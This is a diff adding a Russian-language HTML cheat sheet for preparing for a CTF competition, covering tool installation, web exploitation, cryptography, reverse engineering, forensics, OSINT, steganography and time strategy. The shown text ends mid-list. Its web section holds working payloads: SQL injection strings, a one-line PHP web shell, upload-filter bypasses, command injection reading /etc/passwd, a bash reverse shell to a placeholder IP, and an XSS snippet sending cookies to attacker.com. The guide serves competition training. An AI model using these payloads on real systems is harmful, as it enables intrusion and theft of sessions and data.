@@ -1,0 +1,1231 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Module A - Complete Guide</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #0d1117;
+            color: #c9d1d9;
+            line-height: 1.6;
+        }
+        .topbar {
+            background: #161b22;
+            border-bottom: 1px solid #21262d;
+            padding: 12px 20px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        .topbar h1 {
+            color: #c9d1d9;
+            font-size: 1.2em;
+            font-weight: 400;
+        }
+        .topbar a {
+            color: #58a6ff;
+            text-decoration: none;
+            margin-left: 20px;
+            font-size: 0.9em;
+        }
+        .topbar a:hover {
+            text-decoration: underline;
+        }
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        .sidebar {
+            background: #161b22;
+            border: 1px solid #30363d;
+            padding: 20px;
+            border-radius: 6px;
+            margin-bottom: 30px;
+        }
+        .sidebar h3 {
+            color: #58a6ff;
+            margin-bottom: 15px;
+            font-size: 1.1em;
+        }
+        .sidebar ul {
+            list-style: none;
+            margin: 0;
+        }
+        .sidebar li {
+            margin: 8px 0;
+        }
+        .sidebar a {
+            color: #79c0ff;
+            text-decoration: none;
+            display: block;
+            padding: 5px 10px;
+            border-radius: 4px;
+            transition: background 0.2s;
+        }
+        .sidebar a:hover {
+            background: #21262d;
+        }
+        h1 {
+            color: #58a6ff;
+            margin-bottom: 10px;
+            font-size: 2.5em;
+            border-bottom: 2px solid #21262d;
+            padding-bottom: 10px;
+        }
+        h2 {
+            color: #58a6ff;
+            margin: 40px 0 20px 0;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #21262d;
+            font-size: 1.8em;
+        }
+        h3 {
+            color: #79c0ff;
+            margin: 25px 0 15px 0;
+            font-size: 1.4em;
+        }
+        h4 {
+            color: #a5d6ff;
+            margin: 20px 0 10px 0;
+            font-size: 1.2em;
+        }
+        p {
+            margin: 10px 0;
+            color: #c9d1d9;
+        }
+        code {
+            background: #161b22;
+            color: #79c0ff;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        pre {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 16px;
+            overflow-x: auto;
+            margin: 15px 0;
+        }
+        pre code {
+            background: none;
+            padding: 0;
+            color: #c9d1d9;
+            display: block;
+            font-size: 0.85em;
+            line-height: 1.5;
+        }
+        ul, ol {
+            margin: 15px 0 15px 30px;
+            color: #c9d1d9;
+        }
+        li {
+            margin: 8px 0;
+        }
+        .info {
+            background: #0d419d;
+            border: 1px solid #1f6feb;
+            border-left: 4px solid #58a6ff;
+            padding: 16px;
+            margin: 20px 0;
+            border-radius: 6px;
+        }
+        .warning {
+            background: #6e1f00;
+            border: 1px solid #da3633;
+            border-left: 4px solid #f85149;
+            padding: 16px;
+            margin: 20px 0;
+            border-radius: 6px;
+        }
+        .success {
+            background: #0f3a1c;
+            border: 1px solid #2ea043;
+            border-left: 4px solid #3fb950;
+            padding: 16px;
+            margin: 20px 0;
+            border-radius: 6px;
+        }
+        .tip {
+            background: #693e00;
+            border: 1px solid #bb8009;
+            border-left: 4px solid #f0b72f;
+            padding: 16px;
+            margin: 20px 0;
+            border-radius: 6px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: #0d1117;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            overflow: hidden;
+        }
+        th {
+            background: #161b22;
+            color: #58a6ff;
+            padding: 12px;
+            text-align: left;
+            font-weight: 600;
+            border-bottom: 1px solid #30363d;
+        }
+        td {
+            padding: 12px;
+            border-bottom: 1px solid #21262d;
+        }
+        tr:hover {
+            background: #161b22;
+        }
+        .badge {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 0.75em;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+        .badge-high {
+            background: #f85149;
+            color: white;
+        }
+        .badge-medium {
+            background: #f0b72f;
+            color: #000;
+        }
+        .badge-low {
+            background: #3fb950;
+            color: white;
+        }
+        .category-box {
+            background: #161b22;
+            border: 1px solid #30363d;
+            border-radius: 6px;
+            padding: 20px;
+            margin: 20px 0;
+        }
+        .category-box h3 {
+            margin-top: 0;
+        }
+        .command-box {
+            background: #0d1117;
+            border-left: 3px solid #58a6ff;
+            padding: 10px 15px;
+            margin: 10px 0;
+            border-radius: 4px;
+        }
+        .scroll-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: #1f6feb;
+            color: white;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            border: none;
+            box-shadow: 0 4px 12px rgba(31, 111, 235, 0.4);
+            transition: all 0.3s;
+        }
+        .scroll-top:hover {
+            background: #58a6ff;
+            transform: translateY(-5px);
+        }
+        .tool-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .tool-card {
+            background: #161b22;
+            border: 1px solid #30363d;
+            padding: 15px;
+            border-radius: 6px;
+            transition: border-color 0.2s;
+        }
+        .tool-card:hover {
+            border-color: #58a6ff;
+        }
+        .tool-card h4 {
+            margin-top: 0;
+            color: #58a6ff;
+        }
+    </style>
+</head>
+<body>
+    <div class="topbar">
+        <h1>🚩 CTF Module A - Complete Cheat Sheet</h1>
+        <a href="index.html">← Back to Documentation Portal</a>
+    </div>
+
+    <div class="container">
+        <div class="info">
+            <strong>📋 О модуле:</strong><br>
+            Модуль A: CTF Task-Based - множество задач на разные темы<br>
+            <strong>Время:</strong> Распредели время так, чтобы набрать максимум баллов<br>
+            <strong>Цель:</strong> НЕ обязательно решать все - бери задачи, которые знаешь лучше!
+        </div>
+
+        <div class="sidebar">
+            <h3>📑 Быстрая навигация</h3>
+            <ul>
+                <li><a href="#setup">Установка инструментов</a></li>
+                <li><a href="#web">WEB Exploitation</a></li>
+                <li><a href="#crypto">Cryptography</a></li>
+                <li><a href="#reverse">Reverse Engineering</a></li>
+                <li><a href="#forensics">Forensics</a></li>
+                <li><a href="#osint">OSINT</a></li>
+                <li><a href="#stego">Steganography</a></li>
+                <li><a href="#strategy">Стратегия решения</a></li>
+            </ul>
+        </div>
+
+        <h2 id="setup">🛠️ Установка необходимых инструментов</h2>
+
+        <div class="warning">
+            <strong>⚠️ ВАЖНО: Установи ВСЕ инструменты ПЕРЕД началом!</strong><br>
+            Во время соревнования интернет может быть ограничен.
+        </div>
+
+        <h3>Базовая установка (Debian/Ubuntu/Kali):</h3>
+        <pre><code># Обновление системы
+sudo apt update && sudo apt upgrade -y
+
+# Базовые инструменты
+sudo apt install -y \
+    curl wget git vim nano \
+    python3 python3-pip python3-venv \
+    build-essential \
+    binutils gdb strace ltrace \
+    nmap netcat-traditional socat \
+    sqlmap nikto dirb gobuster \
+    john hashcat hydra \
+    steghide stegsolve exiftool binwalk foremost \
+    wireshark tshark \
+    radare2 ghidra pwntools \
+    imagemagick ffmpeg \
+    unzip p7zip-full rar unrar-free
+
+# Python библиотеки
+pip3 install --upgrade \
+    pwntools requests beautifulsoup4 \
+    pycryptodome gmpy2 z3-solver \
+    pillow numpy scipy
+
+# Дополнительные инструменты
+sudo apt install -y \
+    zsteg outguess \
+    volatility3 \
+    qpdf pdftk \
+    tesseract-ocr</code></pre>
+
+        <h3>Специальные инструменты:</h3>
+        <div class="tool-grid">
+            <div class="tool-card">
+                <h4>🔧 CyberChef</h4>
+                <p>Онлайн: <code>https://gchq.github.io/CyberChef/</code></p>
+                <p>Или скачай оффлайн версию заранее</p>
+            </div>
+
+            <div class="tool-card">
+                <h4>🔧 Ghidra</h4>
+                <pre><code>wget https://github.com/NationalSecurityAgency/ghidra/releases
+# Распакуй и запусти ghidraRun</code></pre>
+            </div>
+
+            <div class="tool-card">
+                <h4>🔧 Burp Suite</h4>
+                <pre><code>sudo apt install burpsuite</code></pre>
+            </div>
+
+            <div class="tool-card">
+                <h4>🔧 stegseek (быстрый steghide)</h4>
+                <pre><code>sudo apt install stegseek</code></pre>
+            </div>
+        </div>
+
+        <h2 id="web">🌐 WEB EXPLOITATION <span class="badge badge-high">ТВОЙ СЛАБЫЙ</span></h2>
+
+        <div class="tip">
+            <strong>💡 Стратегия для WEB:</strong><br>
+            1. Начни с простых задач (видимые уязвимости)<br>
+            2. Смотри исходный код страницы ВСЕГДА<br>
+            3. Проверь robots.txt, sitemap.xml, .git<br>
+            4. Тестируй базовые инъекции сразу
+        </div>
+
+        <h3>🔍 Разведка веб-приложения:</h3>
+        <div class="category-box">
+            <h4>Шаг 1: Изучение исходного кода</h4>
+            <pre><code># В браузере:
+Ctrl+U - Исходный код страницы
+Ctrl+Shift+I - DevTools
+F12 → Network → смотри все запросы
+F12 → Console → проверь JS ошибки
+
+# Ищи в коде:
+- Комментарии <!-- flag{...} -->
+- Скрытые input поля
+- JavaScript код с данными
+- API endpoints
+- Пути к файлам</code></pre>
+
+            <h4>Шаг 2: Проверка стандартных файлов</h4>
+            <pre><code># Попробуй эти URL:
+/robots.txt
+/sitemap.xml
+/.git/
+/.env
+/admin
+/admin.php
+/login
+/backup
+/config.php
+/phpinfo.php
+/.DS_Store
+/wp-admin (для WordPress)</code></pre>
+
+            <h4>Шаг 3: Сканирование директорий</h4>
+            <pre><code># Gobuster
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+# Dirb
+dirb http://target.com
+
+# Nikto (сканер уязвимостей)
+nikto -h http://target.com</code></pre>
+        </div>
+
+        <h3>💉 SQL Injection</h3>
+        <div class="category-box">
+            <h4>Базовые пейлоады для тестирования:</h4>
+            <pre><code># В полях логина/поиска попробуй:
+'
+"
+' OR '1'='1
+' OR 1=1--
+' OR 1=1#
+admin' --
+admin' #
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+
+# Пример успешной SQLi для входа:
+Login: admin' OR '1'='1'--
+Password: anything
+
+# Для поиска:
+search.php?q=' UNION SELECT table_name FROM information_schema.tables--</code></pre>
+
+            <h4>SQLMap (автоматический инструмент):</h4>
+            <pre><code># Базовое использование
+sqlmap -u "http://target.com/page.php?id=1"
+
+# С cookie
+sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"
+
+# POST запрос
+sqlmap -u "http://target.com/login.php" --data="user=admin&pass=123"
+
+# Получить базы данных
+sqlmap -u "http://target.com/page.php?id=1" --dbs
+
+# Получить таблицы
+sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
+
+# Дамп таблицы
+sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump</code></pre>
+        </div>
+
+        <h3>📁 File Upload Vulnerabilities</h3>
+        <div class="category-box">
+            <h4>Типы уязвимостей:</h4>
+            <pre><code># 1. Нет проверки расширения
+- Загрузи shell.php напрямую
+
+# 2. Проверка только на клиенте (JavaScript)
+- Отключи JS в браузере или используй Burp Suite
+
+# 3. Проверка расширения через Content-Type
+# Перехвати запрос в Burp Suite и замени:
+Content-Type: image/png → application/x-php
+
+# 4. Двойное расширение
+shell.php.png
+shell.php.jpg
+
+# 5. Null byte injection
+shell.php%00.png
+shell.php .png
+
+# 6. Загрузка .htaccess
+# Создай файл .htaccess:
+AddType application/x-httpd-php .png
+# Потом загрузи shell.png</code></pre>
+
+            <h4>Простой PHP shell:</h4>
+            <pre><code>&lt;?php system($_GET['cmd']); ?&gt;
+
+# Использование:
+http://target.com/uploads/shell.php?cmd=ls
+http://target.com/uploads/shell.php?cmd=cat%20flag.txt</code></pre>
+        </div>
+
+        <h3>🍪 Cookies & Sessions</h3>
+        <div class="category-box">
+            <pre><code># Посмотреть cookies:
+F12 → Application → Cookies
+
+# Частые уязвимости:
+- admin=0 → admin=1
+- role=user → role=admin
+- isLoggedIn=false → isLoggedIn=true
+
+# JWT токены
+# Декодируй на jwt.io
+# Попробуй изменить payload и поставить signature=none
+
+# Python для декодирования:
+import base64
+import json
+
+cookie = "eyJhbGc..."
+parts = cookie.split('.')
+payload = base64.urlsafe_b64decode(parts[1] + '==')
+print(json.loads(payload))</code></pre>
+        </div>
+
+        <h3>🔓 Command Injection</h3>
+        <div class="category-box">
+            <pre><code># Если есть поле для ввода команды (ping, nslookup, etc)
+# Попробуй:
+; ls
+| ls
+|| ls
+& ls
+&& ls
+` + "`ls`" + `
+$(ls)
+
+# Чтение флага:
+; cat flag.txt
+| cat /etc/passwd
+; cat /var/www/html/flag.txt
+
+# Reverse shell (если нужно):
+; bash -i >& /dev/tcp/YOUR_IP/4444 0>&1</code></pre>
+        </div>
+
+        <h3>🔐 XSS (Cross-Site Scripting)</h3>
+        <div class="category-box">
+            <pre><code># Базовые пейлоады:
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+&lt;svg onload=alert(1)&gt;
+&lt;iframe src="javascript:alert(1)"&gt;
+
+# Кража cookies:
+&lt;script&gt;document.location='http://attacker.com/?c='+document.cookie&lt;/script&gt;
+
+# Обход фильтров:
+&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;
+&lt;img src=x onerror="alert(1)"&gt;
+&lt;svg/onload=alert(1)&gt;</code></pre>
+        </div>
+
+        <h2 id="crypto">🔐 CRYPTOGRAPHY <span class="badge badge-high">ТВОЙ СЛАБЫЙ</span></h2>
+
+        <div class="tip">
+            <strong>💡 Стратегия для Crypto:</strong><br>
+            1. Определи тип шифра (по виду текста)<br>
+            2. Используй CyberChef для автоматического определения<br>
+            3. Начни с простых: Base64, Caesar, XOR<br>
+            4. Для сложных - используй готовые скрипты
+        </div>
+
+        <h3>🔤 Определение типа шифрования:</h3>
+        <div class="category-box">
+            <table>
+                <tr>
+                    <th>Признаки</th>
+                    <th>Тип шифра</th>
+                    <th>Инструмент</th>
+                </tr>
+                <tr>
+                    <td>Заканчивается на == или =</td>
+                    <td>Base64</td>
+                    <td>base64 -d</td>
+                </tr>
+                <tr>
+                    <td>Только A-Z</td>
+                    <td>Caesar/ROT13</td>
+                    <td>CyberChef ROT13</td>
+                </tr>
+                <tr>
+                    <td>Цифры и буквы A-F</td>
+                    <td>Hex</td>
+                    <td>xxd -r -p</td>
+                </tr>
+                <tr>
+                    <td>Точки и тире</td>
+                    <td>Morse Code</td>
+                    <td>CyberChef</td>
+                </tr>
+                <tr>
+                    <td>Много символов, длинный</td>
+                    <td>Base64/Base32</td>
+                    <td>base64 -d</td>
+                </tr>
+                <tr>
+                    <td>Начинается с $1$, $6$</td>
+                    <td>Unix hash</td>
+                    <td>john/hashcat</td>
+                </tr>
+                <tr>
+                    <td>32 символа hex</td>
+                    <td>MD5</td>
+                    <td>hashcat -m 0</td>
+                </tr>
+                <tr>
+                    <td>40 символов hex</td>
+                    <td>SHA1</td>
+                    <td>hashcat -m 100</td>
+                </tr>
+            </table>
+        </div>
+
+        <h3>🛠️ Базовые методы декодирования:</h3>
+        <div class="category-box">
+            <h4>Base64:</h4>
+            <pre><code># Декодирование
+echo "ZmxhZ3t0ZXN0fQ==" | base64 -d
+
+# Кодирование
+echo "flag{test}" | base64
+
+# Множественное декодирование
+echo "encoded" | base64 -d | base64 -d | base64 -d</code></pre>
+
+            <h4>Hex:</h4>
+            <pre><code># Из hex в текст
+echo "666c61677b746573747d" | xxd -r -p
+
+# В hex
+echo "flag{test}" | xxd -p
+
+# Python
+python3 -c "print(bytes.fromhex('666c6167').decode())"</code></pre>
+
+            <h4>ROT13/Caesar:</h4>
+            <pre><code># ROT13
+echo "flag{test}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+# Или онлайн: CyberChef → ROT13
+# Брутфорс всех ROT (CyberChef → ROT Brute Force)</code></pre>
+
+            <h4>XOR:</h4>
+            <pre><code># Python скрипт для XOR
+def xor(data, key):
+    return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
+
+# Пример
+data = bytes.fromhex("...")
+key = b"KEY"
+print(xor(data, key))
+
+# Брутфорс single-byte XOR
+for i in range(256):
+    result = bytes([b ^ i for b in data])
+    if b'flag' in result:
+        print(result)</code></pre>
+        </div>
+
+        <h3>🔨 Взлом хешей:</h3>
+        <div class="category-box">
+            <h4>Hashcat:</h4>
+            <pre><code># MD5
+hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+# SHA1
+hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+# SHA256
+hashcat -m 1400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+# Определить тип хеша
+hashcat --example-hashes | grep -i "hash"</code></pre>
+
+            <h4>John the Ripper:</h4>
+            <pre><code># Базовый взлом
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+
+# Показать результат
+john --show hash.txt
+
+# Для ZIP/RAR
+zip2john file.zip > hash.txt
+john hash.txt</code></pre>
+
+            <h4>Онлайн базы:</h4>
+            <pre><code># Сайты для поиска хешей:
+https://crackstation.net/
+https://hashes.com/
+https://www.md5online.org/</code></pre>
+        </div>
+
+        <h3>📝 RSA (если встретится):</h3>
+        <div class="category-box">
+            <pre><code># Инструменты
+pip3 install pycryptodome gmpy2
+
+# Если дано n, e, c (частые атаки):
+# 1. Маленький n - факторизуй на factordb.com
+# 2. Маленький e (e=3) - Low Public Exponent Attack
+# 3. Общий модуль - Common Modulus Attack
+
+# Python шаблон:
+from Crypto.Util.number import long_to_bytes
+
+# Если есть p, q:
+n = p * q
+phi = (p-1) * (q-1)
+d = pow(e, -1, phi)
+m = pow(c, d, n)
+print(long_to_bytes(m))</code></pre>
+        </div>
+
+        <h2 id="reverse">🔄 REVERSE ENGINEERING <span class="badge badge-high">ТВОЙ СЛАБЫЙ</span></h2>
+
+        <div class="tip">
+            <strong>💡 Стратегия для Reverse:</strong><br>
+            1. Проверь строки в бинарнике ПЕРВЫМ ДЕЛОМ<br>
+            2. Запусти программу и посмотри поведение<br>
+            3. Используй ltrace/strace для отслеживания<br>
+            4. Ghidra для декомпиляции
+        </div>
+
+        <h3>🔍 Базовый анализ:</h3>
+        <div class="category-box">
+            <h4>Шаг 1: Информация о файле</h4>
+            <pre><code># Тип файла
+file binary
+
+# Архитектура и защиты
+checksec binary
+
+# Строки в файле (ОЧЕНЬ ВАЖНО!)
+strings binary
+strings binary | grep flag
+strings binary | grep -i pass</code></pre>
+
+            <h4>Шаг 2: Запуск и отладка</h4>
+            <pre><code># Просто запусти
+./binary
+
+# Отслеживание системных вызовов
+strace ./binary
+
+# Отслеживание библиотечных функций
+ltrace ./binary
+
+# Часто в ltrace видно:
+strcmp("your_input", "correct_flag") = -1</code></pre>
+
+            <h4>Шаг 3: Дизассемблер</h4>
+            <pre><code># Objdump
+objdump -d binary | less
+
+# Radare2
+r2 binary
+aa        # Анализ
+afl       # Список функций
+pdf @main # Дизассемблировать main
+
+# GDB
+gdb binary
+disas main
+break main
+run
+step
+info registers</code></pre>
+        </div>
+
+        <h3>🛠️ Ghidra (графический декомпилятор):</h3>
+        <div class="category-box">
+            <pre><code># Запуск
+ghidraRun
+
+# Создай новый проект → Import File → Analyze
+
+# В Ghidra:
+1. Symbol Tree → Functions → найди main
+2. Decompile window → читай C код
+3. Ищи:
+   - strcmp(input, "flag{...}")
+   - Условия if (input == correct)
+   - XOR операции
+   - Константы (могут быть частями флага)</code></pre>
+        </div>
+
+        <h3>🎯 Частые паттерны:</h3>
+        <div class="category-box">
+            <h4>1. Простое сравнение:</h4>
+            <pre><code># Код типа:
+if (strcmp(input, "secret123") == 0)
+    print("Correct!")
+
+# Решение: просто найди "secret123" в strings</code></pre>
+
+            <h4>2. XOR с ключом:</h4>
+            <pre><code># Код типа:
+for (i=0; i<len; i++)
+    encrypted[i] = input[i] ^ key;
+
+# Решение: найди зашифрованный флаг и ключ, примени XOR</code></pre>
+
+            <h4>3. Base64 внутри:</h4>
+            <pre><code># Посмотри на строки, может быть закодирован Base64
+strings binary | base64 -d</code></pre>
+        </div>
+
+        <h2 id="forensics">🔬 FORENSICS <span class="badge badge-medium">ТВОЙ СЛАБЫЙ</span></h2>
+
+        <div class="tip">
+            <strong>💡 Стратегия для Forensics:</strong><br>
+            1. Определи тип файла (file command)<br>
+            2. Проверь метаданные (exiftool)<br>
+            3. Ищи скрытые файлы (binwalk, foremost)<br>
+            4. Анализируй сетевой трафик (Wireshark)
+        </div>
+
+        <h3>📁 Анализ файлов:</h3>
+        <div class="category-box">
+            <h4>Базовая информация:</h4>
+            <pre><code># Тип файла
+file suspicious_file
+
+# Метаданные
+exiftool image.jpg
+exiftool -a -G1 image.jpg  # Все теги
+
+# Hex дамп (первые байты)
+xxd file | head
+hexdump -C file | head
+
+# Строки
+strings file
+strings -n 10 file  # Минимум 10 символов</code></pre>
+
+            <h4>Извлечение скрытых файлов:</h4>
+            <pre><code># Binwalk (поиск встроенных файлов)
+binwalk file
+binwalk -e file  # Извлечь найденные файлы
+
+# Foremost (восстановление файлов)
+foremost -i file -o output/
+
+# DD (извлечь из offset)
+dd if=file of=extracted.zip bs=1 skip=12345</code></pre>
+
+            <h4>Архивы и ZIP:</h4>
+            <pre><code># Посмотреть содержимое
+unzip -l file.zip
+7z l file.7z
+
+# Взлом пароля ZIP
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt file.zip
+
+# John
+zip2john file.zip > hash
+john hash</code></pre>
+        </div>
+
+        <h3>📦 Анализ образов памяти (Volatility):</h3>
+        <div class="category-box">
+            <pre><code># Определить профиль
+volatility -f memory.dmp imageinfo
+
+# Процессы
+volatility -f memory.dmp --profile=PROFILE pslist
+volatility -f memory.dmp --profile=PROFILE pstree
+
+# Командная строка
+volatility -f memory.dmp --profile=PROFILE cmdline
+
+# Дамп процесса
+volatility -f memory.dmp --profile=PROFILE procdump -p PID -D output/
+
+# Файлы
+volatility -f memory.dmp --profile=PROFILE filescan | grep flag</code></pre>
+        </div>
+
+        <h3>🌐 Анализ сетевого трафика (Wireshark/tshark):</h3>
+        <div class="category-box">
+            <h4>Wireshark (GUI):</h4>
+            <pre><code># Открой .pcap файл
+wireshark capture.pcap
+
+# Фильтры:
+http                    # Только HTTP
+http.request.method == "POST"
+tcp.port == 80
+ip.addr == 192.168.1.1
+frame contains "flag"
+frame contains "password"
+
+# Экспорт объектов:
+File → Export Objects → HTTP
+# Сохрани все найденные файлы</code></pre>
+
+            <h4>tshark (командная строка):</h4>
+            <pre><code># Все HTTP запросы
+tshark -r capture.pcap -Y "http.request" -T fields -e http.request.uri
+
+# Найти строку
+tshark -r capture.pcap -Y 'frame contains "flag"'
+
+# POST данные
+tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.file_data
+
+# Экспорт HTTP объектов
+tshark -r capture.pcap --export-objects http,./output/</code></pre>
+        </div>
+
+        <h2 id="osint">🔍 OSINT <span class="badge badge-medium">ТВОЙ СЛАБЫЙ</span></h2>
+
+        <div class="tip">
+            <strong>💡 Стратегия для OSINT:</strong><br>
+            1. Google - твой главный друг<br>
+            2. Обратный поиск изображений<br>
+            3. Метаданные фото (GPS координаты)<br>
+            4. Социальные сети (username)
+        </div>
+
+        <h3>🔎 Google поиск:</h3>
+        <div class="category-box">
+            <pre><code># Операторы Google:
+"точная фраза"
+site:example.com keyword
+filetype:pdf keyword
+intitle:keyword
+inurl:admin
+-exclude_word
+
+# Примеры:
+site:github.com "flag{"
+filetype:pdf "confidential"
+"email@example.com"</code></pre>
+        </div>
+
+        <h3>🖼️ Изображения:</h3>
+        <div class="category-box">
+            <h4>Метаданные:</h4>
+            <pre><code># Exiftool
+exiftool image.jpg
+
+# GPS координаты
+exiftool -gps* image.jpg
+
+# Все данные
+exiftool -a image.jpg</code></pre>
+
+            <h4>Обратный поиск:</h4>
+            <pre><code># Сайты:
+Google Images (перетащи картинку)
+https://images.google.com/
+https://yandex.ru/images/
+https://tineye.com/</code></pre>
+        </div>
+
+        <h3>👤 Поиск людей/username:</h3>
+        <div class="category-box">
+            <pre><code># Сайты для поиска:
+https://namechk.com/ - проверка username
+https://whatsmyname.app/ - поиск по соцсетям
+https://www.social-searcher.com/
+
+# Google:
+"username" site:twitter.com
+"username" site:facebook.com
+"username" site:instagram.com
+"username" site:linkedin.com
+"username" site:github.com</code></pre>
+        </div>
+
+        <h2 id="stego">🖼️ STEGANOGRAPHY <span class="badge badge-medium">ТВОЙ СЛАБЫЙ</span></h2>
+
+        <div class="tip">
+            <strong>💡 Стратегия для Stego:</strong><br>
+            1. Проверь метаданные (exiftool)<br>
+            2. Попробуй базовые инструменты<br>
+            3. Проверь LSB (Least Significant Bit)<br>
+            4. Попробуй пароль от другой задачи
+        </div>
+
+        <h3>🛠️ Инструменты стеганографии:</h3>
+        <div class="category-box">
+            <h4>Steghide (самый популярный):</h4>
+            <pre><code># Извлечь данные (без пароля)
+steghide extract -sf image.jpg
+
+# С паролем
+steghide extract -sf image.jpg -p password
+
+# Информация
+steghide info image.jpg
+
+# Брутфорс (stegseek)
+stegseek image.jpg /usr/share/wordlists/rockyou.txt</code></pre>
+
+            <h4>Zsteg (PNG/BMP):</h4>
+            <pre><code># Автоматический анализ
+zsteg image.png
+
+# Все методы
+zsteg -a image.png
+
+# Конкретный канал
+zsteg -E b1,rgb,lsb image.png</code></pre>
+
+            <h4>Stegsolve (Java):</h4>
+            <pre><code># Запуск
+java -jar stegsolve.jar
+
+# Открой изображение
+# Кликай стрелки → для просмотра разных каналов
+# Analyze → Data Extract → настрой биты</code></pre>
+
+            <h4>Outguess:</h4>
+            <pre><code># Извлечь данные
+outguess -r image.jpg output.txt</code></pre>
+
+            <h4>Strings:</h4>
+            <pre><code># Простой поиск строк
+strings image.jpg | grep flag</code></pre>
+        </div>
+
+        <h3>🎨 Проверка изображений:</h3>
+        <div class="category-box">
+            <h4>Чек-лист:</h4>
+            <pre><code>1. exiftool image.jpg
+2. strings image.jpg | grep flag
+3. binwalk image.jpg
+4. steghide extract -sf image.jpg
+5. zsteg image.png (для PNG)
+6. stegsolve → перебор каналов
+7. file image.jpg (проверь реальный тип)
+8. xxd image.jpg | head (посмотри hex)</code></pre>
+
+            <h4>LSB (Least Significant Bit):</h4>
+            <pre><code># Python скрипт для извлечения LSB
+from PIL import Image
+
+img = Image.open('image.png')
+pixels = img.load()
+
+bits = ""
+for y in range(img.height):
+    for x in range(img.width):
+        pixel = pixels[x, y]
+        bits += str(pixel[0] & 1)  # Red LSB
+
+# Конвертируй bits в текст
+text = ''.join(chr(int(bits[i:i+8], 2)) for i in range(0, len(bits), 8))
+print(text)</code></pre>
+        </div>
+
+        <h3>🔊 Аудио стеганография:</h3>
+        <div class="category-box">
+            <pre><code># Спектрограмма (может быть текст/QR)
+sox audio.wav -n spectrogram -o spectrogram.png
+
+# Или Sonic Visualizer (GUI)
+# Открой файл → Add Spectrogram
+
+# Strings
+strings audio.wav | grep flag
+
+# Проверь метаданные
+exiftool audio.wav</code></pre>
+        </div>
+
+        <h2 id="strategy">🎯 СТРАТЕГИЯ РЕШЕНИЯ CTF</h2>
+
+        <div class="info">
+            <strong>📊 Как распределить время:</strong>
+        </div>
+
+        <h3>⏱️ Тактика:</h3>
+        <div class="category-box">
+            <ol>
+                <li><strong>Первые 15 минут:</strong>
+                    <ul>
+                        <li>Открой ВСЕ задачи</li>
+                        <li>Прочитай условия</li>
+                        <li>Отметь легкие задачи (sanity check, простые)</li>
+                    </ul>
+                </li>
+                <li><strong>Следующие 30 минут:</strong>
+                    <ul>
+                        <li>Решай ЛЕГКИЕ задачи</li>
+                        <li>Набери быстрые баллы</li>
+                        <li>Не застревай больше 10 минут на одной</li>
+                    </ul>
+                </li>
+                <li><strong>Основное время:</strong>
+                    <ul>
+                        <li>Фокусируйся на задачах, где видишь путь решения</li>
+                        <li>Пропускай то, что совсем не понятно</li>
+                        <li>Возвращайся к пропущенным задачам</li>
+                    </ul>
+                </li>
+                <li><strong>Последний час:</strong>
+                    <ul>
+                        <li>Проверь все частично решенные задачи</li>
+                        <li>Попробуй низко висящие фрукты</li>
+                    </ul>
+                </li>
+            </ol>
+        </div>
+
+        <h3>🎲 Приоритизация задач:</h3>
+        <div class="category-box">
+            <table>
+                <tr>
+                    <th>Приоритет</th>
+                    <th>Категория</th>
+                    <th>Почему</th>
+                </tr>
+                <tr>
+                    <td>🟢 Высокий</td>
+                    <td>OSINT, Forensics basic</td>
+                    <td>Быстрые баллы, меньше кода</td>
+                </tr>
+                <tr>
+                    <td>🟡 Средний</td>
+                    <td>Stego, Reverse (easy)</td>
+                    <td>Есть инструменты, шаблоны</td>
+                </tr>
+                <tr>
+                    <td>🔴 Низкий</td>
+                    <td>Web (сложный), Crypto (RSA), Reverse (hard)</td>
+                    <td>Твои слабые, могут забрать много времени</td>
+                </tr>
+            </table>
+        </div>
+
+        <h3>💡 Советы:</h3>
+        <div class="success">
+            <strong>DO (Делай):</strong>
+            <ul>
+                <li>✅ Используй Ctrl+F для поиска "flag{" во всех файлах</li>
+                <li>✅ Проверяй strings ВСЕГДА</li>
+                <li>✅ Пробуй пустые пароли, admin:admin, root:root</li>
+                <li>✅ Гугли ошибки и странные строки</li>
+                <li>✅ Делай заметки о каждой задаче</li>
+                <li>✅ Если застрял 15+ минут - переходи к другой задаче</li>
+            </ul>
+        </div>
+
+        <div class="warning">
+            <strong>DON'T (Не делай):</strong>
+            <ul>
+                <li>❌ Не трать 2 часа на одну задачу</li>
